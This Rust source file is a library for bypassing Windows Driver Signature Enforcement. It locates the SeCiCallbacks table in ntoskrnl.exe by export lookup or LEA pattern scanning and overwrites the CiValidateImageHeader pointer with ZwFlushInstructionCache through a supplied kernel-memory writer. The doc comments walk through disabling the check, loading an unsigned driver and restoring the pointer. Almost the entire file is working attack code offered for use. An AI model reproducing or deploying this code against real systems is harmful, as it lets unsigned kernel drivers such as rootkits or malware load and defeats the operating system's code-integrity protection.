//! SeCiCallbacks — Windows kernel Code Integrity subversion.
//!
//! This library resolves the `SeCiCallbacks` function pointer table from
//! `ntoskrnl.exe`, reads the `CiValidateImageHeader` entry, overwrites it
//! with `ZwFlushInstructionCache` (disabling DSE), and restores it after
//! the unsigned driver is loaded.
//!
//! ## Usage
//!
//! ```ignore
//! let pe_data = std::fs::read("C:\\Windows\\System32\\ntoskrnl.exe")?;
//! let mut seci = SeCiCallbacks::resolve(ntoskrnl_base, &pe_data)?;
//!
//! // Read original pointer from live kernel memory
//! seci.read_original(|va, buf| phys_read(phys_addr(va, cr3), buf))?;
//!
//! // Disable DSE
//! seci.patch(|va, buf| phys_write(phys_addr(va, cr3), buf))?;
//!
//! // Load unsigned driver via SCM...
//!
//! // Re-enable DSE
//! seci.restore(|va, buf| phys_write(phys_addr(va, cr3), buf))?;
//! ```

use anyhow::{bail, Context, Result};

pub struct SeCiCallbacks {
    pub table_va: u64,
    pub validate_offset: usize,
    pub original_validate: u64,
    pub replacement_ptr: u64,
}

impl SeCiCallbacks {
    pub const VALIDATE_OFFSET: usize = 0x20;

    /// Resolve SeCiCallbacks from ntoskrnl.exe PE data.
    ///
    /// `ntoskrnl_base` is the runtime virtual address of ntoskrnl.exe in
    /// kernel memory (obtained via NtQuerySystemInformation or
    /// EnumDeviceDrivers).
    pub fn resolve(ntoskrnl_base: u64, pe_data: &[u8]) -> Result<Self> {
        Self::resolve_inner(ntoskrnl_base, pe_data, None)
    }

    /// Resolve with a known SeCiCallbacks RVA override.
    ///
    /// Useful when the SeCiCallbacks symbol is not exported by
    /// ntoskrnl.exe (common on some Windows builds) and pattern
    /// scanning fails. Pass the hardcoded RVA for your ntoskrnl
    /// version.
    pub fn resolve_with_rva(ntoskrnl_base: u64, pe_data: &[u8], seci_rva_override: u64) -> Result<Self> {
        Self::resolve_inner(ntoskrnl_base, pe_data, Some(seci_rva_override))
    }

    fn resolve_inner(ntoskrnl_base: u64, pe_data: &[u8], rva_override: Option<u64>) -> Result<Self> {
        let exports = parse_ntoskrnl_exports(pe_data)?;

        let seci_rva = if let Some(rva) = rva_override {
            log::info!("  SeCiCallbacks RVA override: 0x{:x}", rva);
            rva
        } else if let Some(&rva) = exports.get("SeCiCallbacks") {
            log::info!("  Found SeCiCallbacks via export table (RVA: 0x{:x})", rva);
            rva
        } else {
            log::info!("  SeCiCallbacks not in export table, searching via pattern scan...");
            find_seci_callbacks(pe_data, &exports)?
        };

        let zw_flush_rva = exports.get("ZwFlushInstructionCache")
            .copied()
            .context("ZwFlushInstructionCache export not found in ntoskrnl.exe")?;

        let table_va = ntoskrnl_base + seci_rva;
        let replacement_ptr = ntoskrnl_base + zw_flush_rva;

        log::info!("  SeCiCallbacks table VA: 0x{:x} (base 0x{:x} + RVA 0x{:x})", table_va, ntoskrnl_base, seci_rva);
        log::info!("  ZwFlushInstructionCache VA: 0x{:x}", replacement_ptr);
        log::info!("  CiValidateImageHeader slot: table_va + 0x{:x} = 0x{:x}", Self::VALIDATE_OFFSET, table_va + Self::VALIDATE_OFFSET as u64);

        Ok(Self {
            table_va,
            validate_offset: Self::VALIDATE_OFFSET,
            original_validate: 0,
            replacement_ptr,
        })
    }

    /// Read the original CiValidateImageHeader pointer from live kernel memory.
    ///
    /// `reader` receives a virtual address and buffer, and must read
    /// that memory from the live kernel.
    pub fn read_original<F>(&mut self, reader: F) -> Result<()>
    where
        F: Fn(u64, &mut [u8]) -> Result<()>,
    {
        let addr = self.table_va + self.validate_offset as u64;
        let mut buf = [0u8; 8];
        reader(addr, &mut buf)?;
        self.original_validate = u64::from_le_bytes(buf);
        log::info!("  Original CiValidateImageHeader pointer: 0x{:x}", self.original_validate);
        if self.original_validate == 0 {
            log::warn!("  WARNING: CiValidateImageHeader pointer is NULL — read may have silently failed.");
        }
        Ok(())
    }

    /// Overwrite CiValidateImageHeader with ZwFlushInstructionCache.
    ///
    /// After this call, DSE validation returns STATUS_SUCCESS for any
    /// driver image.
    pub fn patch<F>(&self, writer: F) -> Result<()>
    where
        F: Fn(u64, &[u8]) -> Result<()>,
    {
        let addr = self.table_va + self.validate_offset as u64;
        let replacement_bytes = self.replacement_ptr.to_le_bytes();
        log::info!("  Patching CiValidateImageHeader at 0x{:x}: 0x{:x} -> 0x{:x}",
            addr, self.original_validate, self.replacement_ptr);
        writer(addr, &replacement_bytes)?;
        Ok(())
    }

    /// Restore the original CiValidateImageHeader pointer.
    ///
    /// Call this immediately after loading your unsigned driver.
    /// DSE is fully re-enabled.
    pub fn restore<F>(&self, writer: F) -> Result<()>
    where
        F: Fn(u64, &[u8]) -> Result<()>,
    {
        let addr = self.table_va + self.validate_offset as u64;
        let original_bytes = self.original_validate.to_le_bytes();
        log::info!("  Restoring CiValidateImageHeader at 0x{:x}: 0x{:x} (original)",
            addr, self.original_validate);
        writer(addr, &original_bytes)?;
        Ok(())
    }
}

// ── Resolution helpers ──

fn find_seci_callbacks(pe_data: &[u8], _exports: &std::collections::HashMap<String, u64>) -> Result<u64> {
    // Primary: load ntoskrnl.exe into usermode and scan .text for LEA [rip+disp]
    // instructions referencing a callback-table-shaped region in .data.
    #[cfg(windows)]
    {
        if let Some(rva) = find_seci_via_loadlibrary() {
            return Ok(rva);
        }
    }

    // Fallback: scan the on-disk PE file for the same LEA pattern
    if let Some(rva) = scan_for_seci_table_pattern(pe_data) {
        log::info!("  Found SeCiCallbacks via table pattern scan at RVA 0x{:x}", rva);
        return Ok(rva);
    }

    bail!("Could not find SeCiCallbacks (not exported, pattern scan failed)")
}

#[cfg(windows)]
fn find_seci_via_loadlibrary() -> Option<u64> {
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;

    let nt_path: Vec<u16> = OsStr::new("C:\\Windows\\System32\\ntoskrnl.exe")
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();

    unsafe {
        let module = windows_sys::Win32::System::LibraryLoader::LoadLibraryExW(
            nt_path.as_ptr(),
            0,
            windows_sys::Win32::System::LibraryLoader::DONT_RESOLVE_DLL_REFERENCES,
        );
        if module == 0 {
            log::warn!("  LoadLibraryEx failed for ntoskrnl.exe");
            return None;
        }
        let module_base = module as usize;

        let e_lfanew = *((module_base + 0x3C) as *const u32) as usize;
        let num_sections = *((module_base + e_lfanew + 6) as *const u16) as usize;
        let opt_hdr_size = *((module_base + e_lfanew + 20) as *const u16) as usize;
        let sections_offset = e_lfanew + 24 + opt_hdr_size;
        let image_size = *((module_base + e_lfanew + 24 + 56) as *const u32) as usize;

        let mut data_start = 0usize;
        let mut data_end = 0usize;
        let mut text_start = 0usize;
        let mut text_end = 0usize;

        for i in 0..num_sections {
            let sec_off = sections_offset + i * 40;
            let name_bytes = std::slice::from_raw_parts((module_base + sec_off) as *const u8, 8);
            let name_end = name_bytes.iter().position(|&b| b == 0).unwrap_or(8);
            let name_str = std::str::from_utf8(&name_bytes[..name_end]).unwrap_or("");
            let va = *((module_base + sec_off + 12) as *const u32) as usize;
            let vsize = *((module_base + sec_off + 8) as *const u32) as usize;

            if name_str == ".data" {
                data_start = module_base + va;
                data_end = data_start + vsize;
            } else if name_str == ".text" {
                text_start = module_base + va;
                text_end = text_start + vsize;
            }
        }

        if data_start == 0 || text_start == 0 {
            log::warn!("  Could not find .data or .text section in mapped ntoskrnl.exe");
            windows_sys::Win32::Foundation::FreeLibrary(module);
            return None;
        }

        let scan_end = text_end.min(text_start + 0x400000);

        for addr in (text_start..scan_end.saturating_sub(7)).step_by(1) {
            let b0 = *(addr as *const u8);
            let b1 = *((addr + 1) as *const u8);
            let b2 = *((addr + 2) as *const u8);

            // Match: REX.W + LEA r64, [rip+disp32]
            if (b0 != 0x48 && b0 != 0x4C) || b1 != 0x8D { continue; }
            let mod_rm = b2;
            if mod_rm >> 6 != 0 || (mod_rm & 0x07) != 5 { continue; }

            let disp = i32::from_le_bytes(*((addr + 3) as *const [u8; 4]));
            let target = (addr as i64 + 7 + disp as i64) as usize;

            if target < data_start || target >= data_end { continue; }

            // Verify this table has valid-looking function pointers at +0x20 and +0x28
            let val_at_0x20 = *((target + 0x20) as *const u64) as usize;
            let val_at_0x28 = *((target + 0x28) as *const u64) as usize;

            if val_at_0x20 >= module_base && val_at_0x20 < module_base + image_size
                && val_at_0x28 >= module_base && val_at_0x28 < module_base + image_size
                && val_at_0x20 != val_at_0x28
            {
                let seci_rva = (target - module_base) as u64;
                log::info!("  Found SeCiCallbacks via LoadLibraryEx+LEA at RVA 0x{:x} (table[0x20]=0x{:x}, table[0x28]=0x{:x})",
                    seci_rva, val_at_0x20, val_at_0x28);
                windows_sys::Win32::Foundation::FreeLibrary(module);
                return Some(seci_rva);
            }
        }

        log::warn!("  Pattern scan did not find SeCiCallbacks in mapped ntoskrnl.exe");
        windows_sys::Win32::Foundation::FreeLibrary(module);
        None
    }
}

#[cfg(not(windows))]
fn find_seci_via_loadlibrary() -> Option<u64> { None }

fn scan_for_seci_table_pattern(pe_data: &[u8]) -> Option<u64> {
    let (text_raw_off, _text_va, text_size) = get_pe_section_info(pe_data, ".text")?;
    let text_data = pe_data.get(text_raw_off..text_raw_off + text_size)?;

    for i in 0..text_data.len().saturating_sub(7) {
        let b0 = text_data[i];
        let b1 = text_data[i + 1];
        // Match: REX.W + LEA r64, [rip+disp32]
        if (b0 != 0x48 && b0 != 0x4C) || b1 != 0x8D { continue; }
        let mod_rm = text_data[i + 2];
        if mod_rm >> 6 != 0 || (mod_rm & 0x07) != 5 { continue; }

        let disp = i32::from_le_bytes([text_data[i + 3], text_data[i + 4], text_data[i + 5], text_data[i + 6]]);
        let instr_rva = (text_raw_off + i) as i64;
        let target_rva = (instr_rva + 7 + disp as i64) as u64;

        let target_off = rva_to_file_offset(pe_data, target_rva as usize)?;
        if target_off + 0x30 > pe_data.len() { continue; }

        // Verify this table has valid-looking function pointers at +0x20 and +0x28
        let val_at_0x20 = u64::from_le_bytes(pe_data[target_off + 0x20..target_off + 0x28].try_into().ok()?);
        let val_at_0x28 = u64::from_le_bytes(pe_data[target_off + 0x28..target_off + 0x30].try_into().ok()?);

        if val_at_0x20 > 0x10000 && val_at_0x20 < pe_data.len() as u64
            && val_at_0x28 > 0x10000 && val_at_0x28 < pe_data.len() as u64
            && val_at_0x20 != val_at_0x28
        {
            return Some(target_rva);
        }
    }
    None
}

// ── PE utilities ──

fn rva_to_file_offset(pe_data: &[u8], rva: usize) -> Option<usize> {
    let e_lfanew = u32::from_le_bytes(pe_data.get(0x3C..0x40)?.try_into().ok()?) as usize;
    let num_sections = u16::from_le_bytes(pe_data.get(e_lfanew + 6..e_lfanew + 8)?.try_into().ok()?) as usize;
    let opt_hdr_size = u16::from_le_bytes(pe_data.get(e_lfanew + 20..e_lfanew + 22)?.try_into().ok()?) as usize;
    let sections_offset = e_lfanew + 24 + opt_hdr_size;

    for i in 0..num_sections {
        let sec_off = sections_offset + i * 40;
        if sec_off + 40 > pe_data.len() { break; }
        let virtual_address = u32::from_le_bytes(pe_data.get(sec_off + 12..sec_off + 16)?.try_into().ok()?) as usize;
        let virtual_size = u32::from_le_bytes(pe_data.get(sec_off + 8..sec_off + 12)?.try_into().ok()?) as usize;
        let raw_offset = u32::from_le_bytes(pe_data.get(sec_off + 20..sec_off + 24)?.try_into().ok()?) as usize;
        let raw_size = u32::from_le_bytes(pe_data.get(sec_off + 16..sec_off + 20)?.try_into().ok()?) as usize;

        if rva >= virtual_address && rva < virtual_address + virtual_size {
            let offset_in_section = rva - virtual_address;
            if offset_in_section < raw_size {
                return Some(raw_offset + offset_in_section);
            }
        }
    }
    None
}

fn get_pe_section_info(pe_data: &[u8], section_name: &str) -> Option<(usize, usize, usize)> {
    let e_lfanew = u32::from_le_bytes(pe_data.get(0x3C..0x40)?.try_into().ok()?) as usize;
    let num_sections = u16::from_le_bytes(pe_data.get(e_lfanew + 6..e_lfanew + 8)?.try_into().ok()?) as usize;
    let opt_hdr_size = u16::from_le_bytes(pe_data.get(e_lfanew + 20..e_lfanew + 22)?.try_into().ok()?) as usize;
    let sections_offset = e_lfanew + 24 + opt_hdr_size;

    for i in 0..num_sections {
        let sec_off = sections_offset + i * 40;
        if sec_off + 40 > pe_data.len() { break; }
        let name_bytes = &pe_data[sec_off..sec_off + 8];
        let name_end = name_bytes.iter().position(|&b| b == 0).unwrap_or(8);
        let name_str = std::str::from_utf8(&name_bytes[..name_end]).unwrap_or("");

        if name_str == section_name {
            let virtual_size = u32::from_le_bytes(pe_data.get(sec_off + 8..sec_off + 12)?.try_into().ok()?) as usize;
            let virtual_address = u32::from_le_bytes(pe_data.get(sec_off + 12..sec_off + 16)?.try_into().ok()?) as usize;
            let raw_offset = u32::from_le_bytes(pe_data.get(sec_off + 20..sec_off + 24)?.try_into().ok()?) as usize;
            return Some((raw_offset, virtual_address, virtual_size));
        }
    }
    None
}

fn parse_ntoskrnl_exports(pe_data: &[u8]) -> Result<std::collections::HashMap<String, u64>> {
    let e_lfanew = u32::from_le_bytes(
        pe_data.get(0x3C..0x40)
            .ok_or_else(|| anyhow::anyhow!("invalid PE: no e_lfanew"))?
            .try_into()
            .unwrap()
    ) as usize;

    let opt_off = e_lfanew + 4 + 20;
    let export_dir_rva = u32::from_le_bytes(
        pe_data.get(opt_off + 0x70..opt_off + 0x74)
            .ok_or_else(|| anyhow::anyhow!("invalid PE: no export dir RVA"))?
            .try_into()
            .unwrap()
    ) as usize;

    if export_dir_rva == 0 {
        bail!("ntoskrnl.exe has no export directory");
    }

    let export_dir_offset = rva_to_file_offset(pe_data, export_dir_rva)
        .ok_or_else(|| anyhow::anyhow!("cannot convert export dir RVA to file offset"))?;

    let num_names = u32::from_le_bytes(
        pe_data.get(export_dir_offset + 0x18..export_dir_offset + 0x1C)
            .ok_or_else(|| anyhow::anyhow!("invalid export dir"))?
            .try_into()
            .unwrap()
    ) as usize;

    let names_rva = u32::from_le_bytes(
        pe_data.get(export_dir_offset + 0x20..export_dir_offset + 0x24)
            .ok_or_else(|| anyhow::anyhow!("invalid export dir"))?
            .try_into()
            .unwrap()
    ) as usize;

    let ordinals_rva = u32::from_le_bytes(
        pe_data.get(export_dir_offset + 0x24..export_dir_offset + 0x28)
            .ok_or_else(|| anyhow::anyhow!("invalid export dir"))?
            .try_into()
            .unwrap()
    ) as usize;

    let functions_rva = u32::from_le_bytes(
        pe_data.get(export_dir_offset + 0x1C..export_dir_offset + 0x20)
            .ok_or_else(|| anyhow::anyhow!("invalid export dir"))?
            .try_into()
            .unwrap()
    ) as usize;

    let mut exports = std::collections::HashMap::new();

    for i in 0..num_names {
        let names_offset = rva_to_file_offset(pe_data, names_rva + i * 4)?;
        let name_rva = u32::from_le_bytes(pe_data[names_offset..names_offset + 4].try_into()?) as usize;
        let name_file_offset = rva_to_file_offset(pe_data, name_rva)?;

        let mut name_end = name_file_offset;
        while name_end < pe_data.len() && pe_data[name_end] != 0 { name_end += 1; }
        let name = String::from_utf8_lossy(&pe_data[name_file_offset..name_end]).to_string();

        if name == "ZwFlushInstructionCache" || name == "SeCiCallbacks" {
            let ordinals_offset = rva_to_file_offset(pe_data, ordinals_rva + i * 2)?;
            let ordinal_index = u16::from_le_bytes(pe_data[ordinals_offset..ordinals_offset + 2].try_into()?) as usize;
            let functions_offset = rva_to_file_offset(pe_data, functions_rva + ordinal_index * 4)?;
            let func_rva = u32::from_le_bytes(pe_data[functions_offset..functions_offset + 4].try_into()?) as u64;
            exports.insert(name, func_rva);
        }
    }

    if !exports.contains_key("ZwFlushInstructionCache") {
        bail!("ZwFlushInstructionCache export not found in ntoskrnl.exe");
    }

    Ok(exports)
}
